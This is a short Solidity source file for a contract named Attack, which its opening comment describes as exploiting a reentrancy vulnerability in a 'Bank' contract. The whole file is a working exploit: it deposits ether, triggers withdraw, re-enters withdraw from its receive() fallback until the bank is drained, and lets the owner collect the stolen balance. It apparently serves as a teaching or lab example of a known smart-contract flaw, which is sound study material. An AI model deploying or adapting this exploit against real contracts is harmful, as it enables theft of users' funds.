// This is a contract that would exploit the re-entracy vulnerability in the Bank contract

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

contract Attack {

    IBank public bank;
    address public owner;
    uint public attackAmount;

    constructor(address _bankAddress) {
        bank = IBank(_bankAddress);
        owner = msg.sender;
    }

    receive() external payable {
        if(address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }   
    //deposit msg.value into bank then trigger withdraw

    function attack() external payable {
        require (msg.value >= 1 ether, "Need at least 1 ether to attack");
        attackAmount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(attackAmount);
    
    }

    function collect () external {
        require (msg.sender == owner, "Only owner can collect");
        payable(owner).transfer(address(this).balance);
    }
}